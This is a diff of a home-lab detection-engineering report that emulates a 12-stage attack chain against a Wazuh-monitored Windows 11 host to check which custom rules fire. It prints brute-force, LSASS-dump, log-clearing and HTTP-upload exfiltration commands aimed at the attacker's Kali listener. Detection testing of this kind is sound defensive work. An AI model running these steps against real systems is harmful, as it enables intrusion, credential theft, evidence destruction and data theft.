@@ -13,17 +13,19 @@ breaks: true
 |---|---|
 | Author | Võ Minh Khoa |
 | Environment | Isolated VMware lab (Wazuh, Suricata, pfSense, Sysmon) |
-| Evidence window | 2026-08-28 → 2026-08-29 (original chain run) + 2026-10-10 (standalone Stage 2–3 re-test), alert timestamps UTC |
-| Sources | Two lab writeups: baseline detection engineering report and the full attacking-chain playbook |
+| Evidence window | 2026-08-28 → 2026-08-29 (original chain run) + 2026-10-09/10 (standalone Stage 2–3 re-test) + 2026-10-13 (standalone Stage 5, 7, 8b and 10 re-tests), alert timestamps UTC |
+| Sources | Notes from the baseline detection-engineering run and the full attack-chain run, plus the raw alerts in `threat-emulation/evidence-logs/` |
 | Related documents | [`01` setup](https://github.com/Khoavo-187/Wazuh-siem-home-lab/blob/main/docs/01-infrastructure-setup.md) · [`02` ingestion](https://github.com/Khoavo-187/Wazuh-siem-home-lab/blob/main/docs/02-log-ingestion-pipeline.md) · [`03` decoders & rules](https://github.com/Khoavo-187/Wazuh-siem-home-lab/blob/main/docs/03-Detection-engineering.md) |
 
 ---
 
+> **Version alignment (2026-10-22):** This report distinguishes the original August run, later October re-tests, and the **currently committed** `sysmon_rules.xml`, Windows agent `ossec.conf` and Stage 11 scripts. The presence of a script/configuration does not establish execution or alert generation. Doc 3 and this report should carry the same `Pending Validation` statuses.
+
 ## 1. Executive Summary
 
-A 12-step attack chain — **Reconnaissance → Exfiltration** — was emulated against a Windows 11 endpoint to validate the custom detections described in `docs/03`. Each step maps to a MITRE ATT&CK technique and was run from a Kali Linux host inside an isolated lab.
+A numbered 12-stage workflow (**Stage 0 preparation; Stages 1–11 from reconnaissance through an intended exfiltration test**) was documented against the **physical Windows 11 VMware host**. Stage 8b is a separate, optional LSASS test. The report distinguishes actions actually run and evidenced from planned or updated procedures: **Stage 11 has an updated script but no preserved end-to-end transfer or Wazuh detection evidence**. Historical tests must not be treated as validation of subsequent XML revisions.
 
-**Results** (based on the evidence preserved in the two writeups, plus three rounds of re-testing on 2026-10-09/10/13):
+**Results** (based on the raw alerts and screenshots in this repository, including re-tests on 2026-10-09/10/13):
 
 | Outcome | Steps | Count |
 |---|---|---|
@@ -35,11 +37,11 @@ A 12-step attack chain — **Reconnaissance → Exfiltration** — was emulated 
 
 **Key findings**
 
-1. **The chain is observable end to end across four independent layers**: network (Suricata), firewall (pfSense), host (Sysmon and Windows Security log) and file/reputation (FIM and VirusTotal).
-2. **Three rounds of rule fixes and re-testing (2026-10-10, 2026-10-13) closed four of the original five detection gaps.** Stages 5 (Discovery), 7 (Persistence) and 10 (Anti-Forensics) all moved from "a built-in rule fired instead of the custom rule" to "the custom rule fires, confirmed with a raw alert" — `100402`/`100407`/`100400` (Stage 5), `100406` (Stage 7), and `100412` (Stage 10). The common fix was the same confirmed mechanism in each case: chain the custom rule as an explicit child of the specific built-in rule that was winning (`if_sid`), or — for Stage 5 — simply widen the custom rule's own matching scope so it has no sibling to lose to (`docs/03`, §5, item 2).
-3. **Stage 3 is the one precedence case still open.** A 2026-10-10 re-test of the brute-force → logon sequence — this time over **SMB** (Hydra, then `smbclient`), not SSH — captured a genuine successful logon (`4624`) following a genuine failed-logon burst (`100408` fired correctly, correct source IP). The alert that reported it was the built-in `92657`, not the custom `100410`; the same `if_sid`-chaining fix used for Stages 5/7/10 has not yet been applied to `100410`. A separate change to `100410` (`frequency` raised from `1` to `2`) likely makes it harder to trigger even once chained correctly — see `docs/03` §5 and the Gap Analysis below.
-4. **Stage 8b produced a true negative, not a true positive.** `procdump.exe` is not staged on the victim, so the planned LSASS-dump attack has not actually been run. What was captured instead is Windows Defender's own real-time-protection engine (`MsMpEng.exe`) touching LSASS memory during a routine scan — the built-in rule `92900` flagged this as "possible credential dump" (a false positive), while the custom `100411` correctly stayed silent, because its allow-list and `grantedAccess` filter both correctly exclude this exact Defender activity. This is solid evidence the filter logic works, but it is not evidence the rule can catch a real dump attempt.
-5. **Two steps still need further work**: Stage 1 (the pfSense alert shown is unrelated loopback DNS traffic; a WAN-side re-test was attempted but produced no usable evidence — see Stage 1 analysis) and Stage 11 (exfiltration has no captured evidence at all and is the highest-priority item to complete).
+1. **Multiple parts of the workflow are observable across four telemetry layers**: network (Suricata), firewall (pfSense), host (Sysmon and Windows Security log), and file/reputation (FIM and VirusTotal). This does **not** mean that the full chain, especially Stage 1 and Stage 11, has been proven end-to-end.
+2. **Three rounds of rule fixes and re-testing (2026-10-10, 2026-10-13) closed three of the four precedence/scope gaps found in the original run (Stages 5, 7 and 10; Stage 3 is still open).** Stages 5 (Discovery), 7 (Persistence) and 10 (Anti-Forensics) all moved from "a built-in rule fired instead of the custom rule" to "the custom rule fires, confirmed with a raw alert" — `100402`/`100407`/`100400` (Stage 5), `100406` (Stage 7), and `100412` (Stage 10). The common fix was the same confirmed mechanism in each case: chain the custom rule as an explicit child of the specific built-in rule that was winning (`if_sid`), or — for Stage 5 — simply widen the custom rule's own matching scope so it has no sibling to lose to (`docs/03`, §5, item 2).
+3. **Stage 3 has a historical detection and a newer unvalidated correlation configuration.** The 2026-10-10 SMB retest produced a genuine `100408` alert followed by a successful NTLM network logon classified as built-in `92657`, not custom `100410`. The currently committed `sysmon_rules.xml` has **since changed** to `<if_sid>92657</if_sid>` with `<if_matched_sid>100408</if_matched_sid>` and `frequency="1" timeframe="200"`. Neither successful loading nor correct historical matching has been demonstrated after this revision; `frequency="1"` must be reviewed against the installed Wazuh version and a manager-side syntax/behavior test.
+4. **Stage 8b captured a benign control event, not a true positive.** `procdump.exe` is not staged on the victim, so the planned LSASS-dump attack has not actually been run. What was captured instead is Windows Defender's own real-time-protection engine (`MsMpEng.exe`) touching LSASS memory during a routine scan — the built-in rule `92900` flagged this as "possible credential dump" (a false positive), while the custom `100411` stayed silent; the access mask (`0x101000`) is not one the rule looks for. The allow-list is not proven by this event (the exported path has doubled backslashes that the allow-list regex does not expect), so this shows that telemetry reaches the rule engine, not that the rule can catch a real dump attempt.
+5. **Stage 1 and Stage 11 remain evidence gaps.** Stage 1’s pfSense alert is unrelated loopback DNS; a WAN-side retest has no clean correlated evidence. Stage 11 has a newer HTTP POST script but no preserved file-receipt/integrity evidence and no raw alert from `100413`. Rule `100410` and the LSASS positive case also remain pending validation.
 6. **Log clearing did not blind the SOC**: the Security log was wiped on the endpoint, yet the alert had already been forwarded to Wazuh — and, after the fix, forwarded at the intended severity (level 15, not the built-in's level 5).
 
 ---
@@ -48,7 +50,7 @@ A 12-step attack chain — **Reconnaissance → Exfiltration** — was emulated 
 
 ### 2.1 Rules of engagement
 
-- All activity ran inside an isolated lab network against systems owned by the author.
+- All activity was confined to systems owned by the author. VMware VMnet1 isolates the lab network segment, but the monitored Windows 11 endpoint is also the **physical VMware host**; exercises on it are not equivalent to running a disposable isolated Windows guest.
 - Payloads were benign: the EICAR test string, `calc.exe` as the persistence target, and a self-written reverse shell using the standard .NET `TCPClient` (no vulnerability exploited).
 - Every artifact created by the emulation is listed in [Appendix B](#appendix-b--artifacts-and-cleanup) together with its cleanup command.
 
@@ -61,21 +63,22 @@ A 12-step attack chain — **Reconnaissance → Exfiltration** — was emulated 
 | Host | Role | IP |
 |---|---|---|
 | Kali Linux | Attacker | `192.168.60.135` (LAN) |
-| Windows 11 (`LAPTOP-VF92GC15`) | Victim, Wazuh agent, Sysmon, Suricata (Npcap), FIM | `192.168.60.1` |
+| Windows 11 (`LAPTOP-VF92GC15`) | **Physical VMware host and monitored victim**; Wazuh agent, Sysmon, Suricata (Npcap), FIM. It is not an isolated guest VM and cannot be restored with a guest snapshot. | `192.168.60.1` |
 | Wazuh Manager | SIEM/XDR, VirusTotal integration | `192.168.60.137` |
 | pfSense | Firewall and gateway, remote syslog | `192.168.60.254` |
 
 ### 2.3 Telemetry preconditions
 
-A rule can only fire if its event exists. Before the run these items were checked or enabled:
+A rule can only fire if its event exists. The following are configuration requirements and/or previously observed conditions; items explicitly marked unverified must not be treated as checked before the original run:
 
 | Layer | Requirement | Used by |
 |---|---|---|
 | Windows | Advanced audit policy: Logon (success and failure), Process Creation with command line | Events `4624`, `4625`, `4688` |
-| Sysmon | Event IDs 1, 3, 10, 11, 13 present in the configuration | Stages 4–8b, 11 |
-| Wazuh agent | Channels `Security`, `Sysmon/Operational`; Suricata `eve.json`; FIM `realtime="yes"` on the `virustotaltest` folder(only use for folder `/virustotaltest`)  | All |
+| Sysmon | Event IDs 1, 3, 10, 11, 13 as filtered in the live Sysmon configuration; production of every event type must be checked | Stages 4–8b, Stage 11 network fallback |
+| Wazuh agent | `Security`, `Microsoft-Windows-Sysmon/Operational`, **`Microsoft-Windows-PowerShell/Operational` (configured but not end-to-end verified)**; Suricata `eve.json`; realtime FIM for `virustotaltest` | Endpoint stages |
+| PowerShell | Module Logging (4103) and Script Block Logging (4104) activation has **not** been verified on the endpoint | Stage 11 custom `100413` (4103) |
 | Wazuh manager | Custom rules loaded (`wazuh-logtest`), VirusTotal integration active | All |
-| Environment | NTP synced on all hosts, clean dashboard baseline, start timestamp recorded (`date -u`), `procdump.exe` pre-staged | Timeline, Stage 8b |
+| Environment | Check host and guest clocks against one source; capture `date -u` before each future run. Historical pfSense samples show a significant clock discrepancy. `procdump.exe` was **not staged or run** during the recorded Stage 8b test. | Timeline, Stage 8b |
 
 ### 2.4 Verdict criteria
 
@@ -92,7 +95,7 @@ A rule can only fire if its event exists. Before the run these items were checke
 | # | Stage | Tactic | Technique | Procedure (tool, source → target) | Telemetry expected | Detection expected |
 |---|---|---|---|---|---|---|
 | 0 | Preparation | — | — | Remove old Hydra session; full packet capture with `tcpdump` on Kali | pcap | — |
-| 1 | Reconnaissance | Reconnaissance, Discovery | T1595, T1018 | `nmap -sS -T4 -p-`, `ping -c 5` — Kali → `192.168.60.1` | Suricata alert, pfSense log | Suricata `100300`, pfSense `100130`/`100201` |
+| 1 | Reconnaissance | Reconnaissance, Discovery | T1595, T1018 | `nmap -sS -T4 -p-`, `ping -c 5` — Kali → `192.168.60.1` on the same VMnet1 segment | Endpoint Suricata alert; pfSense only if test traffic actually crosses it | Suricata `100300`; pfSense `100130`/`100201` only for separately routed tests |
 | 2 | Brute Force | Credential Access | T1110 | `hydra` against SSH (`user.txt`, `password.txt`) — Kali → `:22` | Suricata alert, Windows `4625` | `100301`, `60122` |
 | 3 | Successful Access | Initial Access | T1078 | `ssh lenovo@192.168.60.1` with the cracked credentials | Windows `4624` | `100410` (correlation) |
 | 4 | Execution | Execution, Defense Evasion | T1059.001, T1027 | `powershell -NoProfile -EncodedCommand <base64>` | Sysmon EID 1 | `100401` |
@@ -103,13 +106,13 @@ A rule can only fire if its event exists. Before the run these items were checke
 | 8b | Credential Access | Credential Access | T1003.001 | `procdump -ma lsass.exe` through the reverse shell | Sysmon EID 10 | `100411` |
 | 9 | File Lifecycle | — | — | Modify and delete files in the monitored folder | syscheck events | FIM (modified, deleted) |
 | 10 | Cleanup / Anti-Forensics | Defense Evasion | T1070.001 | `wevtutil cl Security` | Security Event `1102` | `100412` |
-| 11 | Exfiltration | Exfiltration | T1059.001, T1567.002 | `Compress-Archive`, then `Invoke-WebRequest -Method Post -InFile` uploads the zip to a listener on Kali | PowerShell Operational (Module Logging) | `100413` |
+| 11 | HTTP Transfer / Exfiltration Simulation | Execution, Exfiltration | T1059.001; **T1048.003 conditional** (HTTP outside C2; not cloud storage) | `Compress-Archive`; committed Windows script calls `Invoke-WebRequest -Method Post -InFile` to Kali `:8000/upload` | PowerShell Module Logging 4103; Sysmon EID 3 fallback | `100413` **pending**; generic `100404` may observe PowerShell network connection |
 
 ---
 
 ## 4. Execution and Analysis by Stage
 
-Each stage lists the emulated behaviour, the telemetry it produced, the alert observed, the screenshots kept in the writeup, and an analysis of what the result does and does not prove. Times are UTC (the lab's local time is UTC+7).
+Each stage lists the emulated behaviour, the telemetry it produced, the alert observed, the screenshots kept in the repository, and an analysis of what the result does and does not prove. Times are UTC (the lab's local time is UTC+7).
 
 ### Stage 0 — Preparation
 
@@ -131,9 +134,9 @@ nmap -sS -T4 -p- 192.168.60.1
 ping -c 5 192.168.60.1
 ```
 
-![Figure 2 — Stage 1 evidence screenshot](../screenshot/Stage1_recon.png)
+![Figure 2 — Stage 1 evidence screenshot](https://github.com/Khoavo-187/Wazuh-siem-home-lab/raw/main/screenshot/Stage1_recon.png)
 
-*Figure 2 — Stage 1: reconnaissance evidence screenshot (as placed in the original writeup).*
+*Figure 2 — Stage 1: reconnaissance evidence screenshot (original run).*
 
 **Alert observed**
 
@@ -148,7 +151,7 @@ ping -c 5 192.168.60.1
 
 - **The alert is not caused by the scan.** Source and destination are the loopback address, the interface is `lo0` and the port is 53 (DNS). It is background DNS traffic on the firewall itself, not Nmap traffic from Kali.
 - **pfSense is probably not the right sensor for this step.** Kali and the Windows host sit in the same `/24`, and a firewall only logs traffic that crosses it (inference). This is the east-west case that motivates the second Suricata instance on the endpoint, so the expected alert is Suricata `100300` (sid `1000002`). No raw alert for it is preserved for this run.
-- **Clock offset on pfSense.** The syslog timestamp in the log line is `Aug 27 11:57:42`, while Wazuh received the event on 2026-08-28 at 05:32 UTC, a gap of about 17.5 hours. This points to a time-zone or NTP problem on pfSense and would break cross-source correlation.
+- **Clock offset on pfSense.** The syslog timestamp in the log line is `Aug 27 11:57:42`, while Wazuh received the event on 2026-08-28 at 05:32 UTC, a gap of about 17.5 hours. pfSense is configured for `Etc/UTC` with an NTP pool, so a time-zone error is unlikely; a VM clock that fell behind while the host was asleep is more plausible. Either way it would break cross-source correlation.
 - **The false positive is already addressed.** The current version of `100140` only counts connections to administrative ports (`22, 23, 445, 3389, 5900, 1433, 3306`), so loopback DNS no longer matches.
 
 **Re-test attempt: triggering pfSense from the WAN side**
@@ -157,11 +160,11 @@ The root cause above — a same-LAN scan not necessarily transiting pfSense's ow
 
 1. Attack the pfSense **WAN** interface from outside the LAN (i.e. treat it like an internet-facing attacker, not a same-subnet neighbour): an Nmap scan or a Netcat-based port brute force directed at the WAN address.
 2. Watch pfSense's own firewall decision on that traffic — **block** or **pass** — in the `filterlog`.
-3. If passed, the connection is forwarded (via the WAN→LAN port-forward / NAT rule) through to the victim's LAN IP, so the same traffic should also show up endpoint-side (Suricata, Sysmon EID 3).
+3. A packet reaching pfSense WAN will be evaluated by the WAN firewall rules. **No inbound WAN→LAN port-forward is represented by the documented topology**, so do not expect an unsolicited probe to reach the Windows endpoint. Such a test can still exercise pfSense block rules (`100101`/`100102`) if `filterlog` records it.
 
 This is architecturally the traffic pfSense's rule tree is actually built to reason about (`srcip` outside the LAN, a real `block`/`pass` decision at the boundary) — unlike the original Stage 1 attempt, where attacker and victim share the same `/24` and pfSense mostly only sees its own background traffic.
 
-**No usable evidence was captured.** The attempt produced events where the logged source IP did not look right — in a related Stage 2 re-test session (`192.168.60.1`, the *victim's own* LAN IP, appeared as the attacker source in one alert; see Stage 2 below) rather than a genuine external or WAN-side address. The likely cause is **NAT hairpinning**: when a host reaches the public/WAN IP through a path that pfSense ends up routing back through its own LAN interface, the original source address can be lost or rewritten, and Windows/Wazuh then report a local address instead of the real one. This has **not been confirmed** with a packet capture on both the WAN and LAN interfaces simultaneously, so treat it as a working hypothesis, not a finding.
+**No usable evidence was captured.** The attempt produced events where the logged source IP did not look right — in a related Stage 2 re-test session (`192.168.60.1`, the *victim's own* LAN IP, appeared as the attacker source in one alert; see Stage 2 below) rather than a genuine external or WAN-side address. The likely cause is **NAT hairpinning**: when a host reaches the public/WAN IP through a path that pfSense ends up routing back through its own LAN interface, the original source address can be lost or rewritten, and Windows/Wazuh then report a local address instead of the real one. This has **not been confirmed** with a packet capture on both the WAN and LAN interfaces simultaneously, so treat it as a working hypothesis, not a finding. A second candidate is asymmetric routing: Kali has two adapters (`192.168.254.100` and `192.168.60.135`), so replies can leave by a different interface than the one the scan used. Test with Kali attached only to the WAN-side network.
 
 **Verdict: ⚠️ Inconclusive** — re-run and capture the Suricata `100300` alert (see §7). The WAN-side idea above is worth repeating with `tcpdump` on both pfSense interfaces at once, to see directly whether the source IP survives the NAT hop.
 
@@ -174,16 +177,16 @@ This is architecturally the traffic pfSense's rule tree is actually built to rea
 hydra -L user.txt -P password.txt ssh://192.168.60.1
 ```
 
-![Figure 3 — Stage 2 evidence screenshot](../screenshot/Stage2_bruteforce.png)
+![Figure 3 — Stage 2 evidence screenshot](https://github.com/Khoavo-187/Wazuh-siem-home-lab/raw/main/screenshot/Stage2_bruteforce.png)
 
-*Figure 3 — Stage 2: brute-force evidence screenshot (as placed in the original writeup).*
+*Figure 3 — Stage 2: brute-force evidence screenshot (original run).*
 
 **Alerts observed**
 
 | Layer | Rule | Level | Time | Key fields |
 |---|---|---|---|---|
 | Network (Suricata on the endpoint) | `100301` (sid `1000003`, rev 2) | 8 | 05:45:44 | `192.168.60.135:51814` → `192.168.60.1:22`, TCP, MITRE T1110 / TA0006 |
-| Host (Windows Security) | `60122` (Event `4625`) | 5 | 05:46:41 | `targetUserName: lenovo`, `logonType: 8`, process `sshd.exe`, `subStatus: 0xc000006a` (wrong password) |
+| Host (Windows Security) | `60122` (Event `4625`) | 5 | 05:46:44 (archive timestamp) | `targetUserName: lenovo`, `logonType: 8`, process `sshd.exe`, `status: 0xc000006d` (logon failure; the `subStatus` field appears only in the SMB re-test alert) |
 
 **Analysis**
 
@@ -216,11 +219,11 @@ A later, standalone re-test of the brute-force → logon sequence (separate sess
 
 A separate, earlier attempt on 2026-10-09 also produced a `100408` alert, but with `ipAddress` showing `192.168.60.1` — the **victim's own LAN address** rather than Kali's — a clear artifact rather than a genuine attacker IP (Figure 4). This matches the WAN-side NAT-hairpin hypothesis noted in Stage 1: if that attempt was made against the WAN-facing address through a reflected/hairpinned path, the true source can get lost. Not confirmed; flagged here for the same reason as Stage 1.
 
-![Figure 4 — Stage 2, 2026-10-09 preliminary attempt: `100408` fires but `ipAddress` shows the victim's own LAN address](../screenshot/stage2_rule.png)
+![Figure 4 — Stage 2, 2026-10-09 preliminary attempt: 100408 fires but ipAddress shows the victim's own LAN address](https://github.com/Khoavo-187/Wazuh-siem-home-lab/raw/main/screenshot/stage2_rule.png)
 
 *Figure 4 — The source IP artifact that motivated the WAN-hairpin hypothesis in Stage 1.*
 
-See [`threat-emulation/evidence-logs/stage02-rule-100408-bruteforce-retest.json`](../threat-emulation/evidence-logs/stage02-rule-100408-bruteforce-retest.json).
+See [`threat-emulation/evidence-logs/stage02-rule-100408-bruteforce-retest.json`](https://github.com/Khoavo-187/Wazuh-siem-home-lab/blob/main/threat-emulation/evidence-logs/stage02-rule-100408-bruteforce-retest.json).
 
 ---
 
@@ -231,9 +234,9 @@ See [`threat-emulation/evidence-logs/stage02-rule-100408-bruteforce-retest.json`
 ssh lenovo@192.168.60.1
 ```
 
-![Figure 5 — Stage 3 evidence screenshot](../screenshot/Stage3_access.png)
+![Figure 5 — Stage 3 evidence screenshot](https://github.com/Khoavo-187/Wazuh-siem-home-lab/raw/main/screenshot/Stage3_access.png)
 
-*Figure 5 — Stage 3 evidence screenshot (as placed in the original writeup).*
+*Figure 5 — Stage 3 evidence screenshot (original run).*
 
 **First attempt (2026-08-28) — alert observed**
 
@@ -241,7 +244,7 @@ ssh lenovo@192.168.60.1
 |---|---|
 | Rule | `60115` — user account locked out, level 9 |
 | Event | Windows `4740` for account `LENOVO` |
-| Time | 05:46:41 (event time) — the same second as a failed logon of Stage 2 |
+| Time | 05:46:44 (alert time) — within the same second as the Stage 2 failed logon |
 | Mapping | T1110, T1531 |
 
 **Analysis — first attempt**
@@ -266,16 +269,16 @@ Following the account unlock and the Stage 2 re-test above (Hydra against SMB, t
 | Key fields | `targetUserName: LENOVO`, `ipAddress: 192.168.60.135`, `logonType: 3`, `authenticationPackageName: NTLM`, `workstationName: KALI` |
 | Rule's own mapping | T1550.002 (Pass the Hash), T1078.002 (Domain Accounts), T1021.001 (Remote Desktop Protocol) — **the T1021.001/RDP tag is the same built-in boilerplate issue noted below; the real technique here is T1021.002 (SMB/Windows Admin Shares)** |
 
-See [`threat-emulation/evidence-logs/stage03-rule-92657-successful-logon.json`](../threat-emulation/evidence-logs/stage03-rule-92657-successful-logon.json). The same Discover session also showed `67028` ("Special privileges assigned to new logon", level 3) immediately after, and the `60122` failed-logon burst immediately before — the same sequence as the raw alerts (no screenshot captured for this specific view).
+See [`threat-emulation/evidence-logs/stage03-rule-92657-successful-logon.json`](https://github.com/Khoavo-187/Wazuh-siem-home-lab/blob/main/threat-emulation/evidence-logs/stage03-rule-92657-successful-logon.json). The same Discover session also showed `67028` ("Special privileges assigned to new logon", level 3) immediately after, and the `60122` failed-logon burst immediately before — the same sequence as the raw alerts (no screenshot captured for this specific view).
 
 **Analysis — re-test**
 
 - **The goal of this stage is now demonstrated**: a real `4624` following a real failed-logon burst, 18 seconds apart, same `targetUserName` and `ipAddress` as Stage 2's `100408`.
-- **Built-in rule, not the custom one — same pattern as Stages 5, 7 and 10.** The custom `100410` (`if_sid 60106`, `if_matched_sid 100408`) did not appear; `92657` did. `92657` is very likely another child of `60106` (the base "logon success" rule), making this the same sibling-precedence issue already confirmed for `100406`/`92302`. See `docs/03`, §3.3 (`100410`) and §5, item 2, for the fix (`if_sid 92657` instead of `60106`) — not yet applied.
+- **Built-in rule, not the custom one — the same sibling-precedence pattern seen elsewhere in the project.** The **then-current** custom `100410` (`if_sid 60106`, `if_matched_sid 100408`) did not appear; `92657` did. `92657` is very likely another child of `60106` (the base "logon success" rule). This is the same mechanism already confirmed and fixed for `100406`/`92302` and `100412`/`63103` (`docs/03`, §3.3 and §5, item 2) — The **current** XML now chains `100410` under `92657`; the correction was applied **after** this historical retest and has no confirmed positive result yet.
 - **Confirmed: this is SMB, not SSH and not RDP.** `92657`'s built-in description guesses "Possible RDP connection" — that wording is generic boilerplate Wazuh attaches to any NTLM `logonType 3` network logon, and it is misleading here: the access was `smbclient`, not RDP. The `logonType 3`/NTLM/`NtLmSsp` fields are the standard SMB signature, matching Stage 2's re-test above. This stage's *first* attempt (SSH, `logonType 8`) and this re-test (SMB, `logonType 3`) are two different access methods proving the same underlying idea — a successful logon following a credential-stuffing burst — over two different services.
 - Because `ipAddress` was populated correctly here, the earlier concern (Stage 2) that SSH logons might never populate it, and so `100408`/`100410`'s `same_field ipAddress` correlation could never match, does not apply to this run — the correlation condition itself is satisfiable; only the sibling-rule precedence stopped `100410` from being the one reported.
 
-**Verdict: ⚠️ Detected, but by a built-in rule (`92657`)** — joins Stages 5, 7 and 10 in the same precedence pattern; custom `100410` not yet proven.
+**Verdict: ⚠️ Detected, but by a built-in rule (`92657`)** — the one remaining open instance of the sibling-precedence pattern (`docs/03`, §5, item 2); custom `100410` not yet proven.
 
 ---
 
@@ -322,9 +325,9 @@ systeminfo
 tasklist
 ```
 
-![Figure 6 — Stage 5 evidence screenshot](../screenshot/Stage5_discovery.png)
+![Figure 6 — Stage 5 evidence screenshot](https://github.com/Khoavo-187/Wazuh-siem-home-lab/raw/main/screenshot/Stage5_discovery.png)
 
-*Figure 6 — Stage 5 evidence screenshot (as placed in the original writeup, 2026-08-28 run).*
+*Figure 6 — Stage 5 evidence screenshot (original 2026-08-28 run).*
 
 **Alert observed**
 
@@ -354,9 +357,10 @@ net
 net1
 arp -a
 ```
+
 Following a rewrite of the Sysmon rules (scope widened, see `docs/03` §3.3), a re-test from a PowerShell parent produced six custom-rule alerts in under 10 seconds:
 
-![Figure 7 — Stage 5 re-test, 2026-10-13: custom rules firing for whoami, tasklist, systeminfo, net, net1 and ARP.EXE](../screenshot/stage5_evidence.png)
+![Figure 7 — Stage 5 re-test, 2026-10-13: custom rules firing for whoami, tasklist, systeminfo, net, net1 and ARP.EXE](https://github.com/Khoavo-187/Wazuh-siem-home-lab/raw/main/screenshot/stage5_evidence.png)
 
 *Figure 7 — Six consecutive custom-rule alerts; no built-in `92031` row appears in this view.*
 
@@ -369,15 +373,15 @@ Following a rewrite of the Sysmon rules (scope widened, see `docs/03` §3.3), a 
 | `100402` | 6 | 05:04:42 | `net1.exe` — "Reconnaissance binary executed" |
 | `100402` | 6 | 05:04:42 | `net.exe` — "Reconnaissance binary executed" |
 
-See [`threat-emulation/evidence-logs/stage05-rule-100407-recon-burst.json`](../threat-emulation/evidence-logs/stage05-rule-100407-recon-burst.json) and [`stage05-rule-100400-shell-child-arp.json`](../threat-emulation/evidence-logs/stage05-rule-100400-shell-child-arp.json) for the raw alerts (`100402`'s own raw alert was not individually exported; Figure 7 is the Discover view for the whole sequence).
+See [`threat-emulation/evidence-logs/stage05-rule-100407-recon-burst.json`](https://github.com/Khoavo-187/Wazuh-siem-home-lab/blob/main/threat-emulation/evidence-logs/stage05-rule-100407-recon-burst.json) and [`stage05-rule-100400-shell-child-arp.json`](https://github.com/Khoavo-187/Wazuh-siem-home-lab/blob/main/threat-emulation/evidence-logs/stage05-rule-100400-shell-child-arp.json) for the raw alerts (`100402`'s own raw alert was not individually exported; Figure 7 is the Discover view for the whole sequence).
 
 **Analysis — re-test**
 
 - **`100402`'s scope is now confirmed** (current rule XML): `(?i)(?:whoami|systeminfo|tasklist|nltest|net|net1)\.exe$`, plus the correlation rule `100407` now correlates off `100402` directly. `net.exe`/`net1.exe` both match, as shown. **`arp` is confirmed not in this pattern** — `ARP.EXE` only triggers the generic `100400` ("Shell spawned child process"), not "Reconnaissance binary executed". Add `arp` to `100402` if parity with `net`/`net1`/`whoami` is wanted; it is a one-token change.
-- **`100407`'s correlation logic is confirmed correct**: it fired once, exactly when the 3rd qualifying binary (`systeminfo`) landed within the 120-second window of the first (`whoami`). The later `net`/`net1` pair (2 matches) correctly did **not** trigger a second `100407`, since 2 is below the `frequency=3` threshold.
-- **`100400`'s known bug is fixed and its scope confirmed widened.** The earlier version truncated the description at `$(win.eventdata.user` (missing closing parenthesis, `docs/03` §5 item 13) — the new alert renders the full value. `parentImage` is now confirmed `(?i)(?:powershell|pwsh|cmd|net)\.exe$` (widened beyond PowerShell, matching the rename to "Shell spawned child process" / group `shell_child`), and a negated `image` filter now excludes `whoami`/`systeminfo`/`tasklist`/`nltest` from `100400` so those don't double-fire alongside `100402`. **Note**: `net`/`net1` are *not* in that exclusion list, so both rules match a `net`/`net1` child of a shell — but Wazuh reports one rule per event, and Figure 7 shows only `100402` rows for `net.exe` and `net1.exe` (no matching `100400` rows), so `100402` is the one reported. Which sibling wins in general is not pinned down by this evidence.
+- **`100407`'s correlation logic is confirmed correct**: it fired once, exactly when the 3rd qualifying binary (`systeminfo`) landed within the 120-second window of the first (`whoami`). No second `100407` appeared for the later `net`/`net1` events; `100407` has no `ignore`, so this is not explained by the threshold arithmetic alone — treat it as observed behaviour.
+- **`100400`'s known bug is fixed and its scope confirmed widened.** The earlier version truncated the description at `$(win.eventdata.user` (missing closing parenthesis, `docs/03` §5 item 13) — the new alert renders the full value. `parentImage` is now confirmed `(?i)(?:powershell|pwsh|cmd|net)\.exe$` (widened beyond PowerShell, matching the rename to "Shell spawned child process" / group `shell_child`), and a negated `image` filter now excludes `whoami`, `systeminfo`, `tasklist`, `nltest`, `curl`, `bitsadmin` and `certutil`, so that the more specific rules are not shadowed. **Caveat (current XML)**: the live exclusion list does not contain `net`/`net1`. One event produces one alert and `100400` precedes `100402` in the file, so `net`/`net1` started from a shell should now be reported as `100400` and not counted by `100407`. The raw alerts above predate that exclusion list; re-run Stage 5 before relying on them for `net`/`net1`.
 - **Built-in `92031` does not appear in Figure 7's six rows** — six custom alerts cover the same window the original run's single `92031` alert occupied, and no `92031` row is visible here. This is not an exhaustive search of the whole index, so it is reported as "not observed in this view" rather than "confirmed absent".
-- **Group-string note** (`docs/03` §5, item 16): `100400` and `100402`'s inner `<group>` strings now end with a trailing comma (`shell_child,`, `recon,`). The `100400` alert in this re-test still shows clean groups (`windows`, `process_lineage`, `shell_child`), but alerts captured later from rules with the same trailing comma show merged names (see Stage 7 and Stage 10) — so this is worth fixing, not just cosmetic.
+- **Group names**: the stored alerts for later rules (`100406`, `100412`) show merged group names (`windowspersistence`, `windowslog_cleared`); see `docs/03` §5 item 16, and check `rule.groups` on a fresh `100400`/`100402` alert as well.
 
 **Verdict: ✅ Detected by custom rules** (`100402`, `100407`, `100400`) — all three raised raw alerts in the 2026-10-13 re-test, closing the Stage 5 gap. `arp.exe`-specific coverage remains a minor, optional follow-up.
 
@@ -395,13 +399,13 @@ python3 -m http.server 8000
 curl http://192.168.60.135:8000/eicar-facebook.com -o "C:\Users\LENOVO\Downloads\virustotaltest\eicar2.com"
 ```
 
-![Figure 8 — Stage 6 evidence screenshot 1 of 3](../screenshot/Stage6_payload1.png)
+![Figure 8 — Stage 6 evidence screenshot 1 of 3](https://github.com/Khoavo-187/Wazuh-siem-home-lab/raw/main/screenshot/Stage6_payload1.png)
 
-![Figure 9 — Stage 6 evidence screenshot 2 of 3](../screenshot/Stage6_payload2.png)
+![Figure 9 — Stage 6 evidence screenshot 2 of 3](https://github.com/Khoavo-187/Wazuh-siem-home-lab/raw/main/screenshot/Stage6_payload2.png)
 
-![Figure 10 — Stage 6 evidence screenshot 3 of 3](../screenshot/Stage6_payload3.png)
+![Figure 10 — Stage 6 evidence screenshot 3 of 3](https://github.com/Khoavo-187/Wazuh-siem-home-lab/raw/main/screenshot/Stage6_payload3.png)
 
-*Figures 8–10 — Stage 6: the three alerts raised by one download (Suricata, FIM, VirusTotal), as placed in the original writeup.*
+*Figures 8–10 — Stage 6: the three alerts raised by one download (Suricata, FIM, VirusTotal), original run.*
 
 **Three layers fired from one action**
 
@@ -429,9 +433,9 @@ curl http://192.168.60.135:8000/eicar-facebook.com -o "C:\Users\LENOVO\Downloads
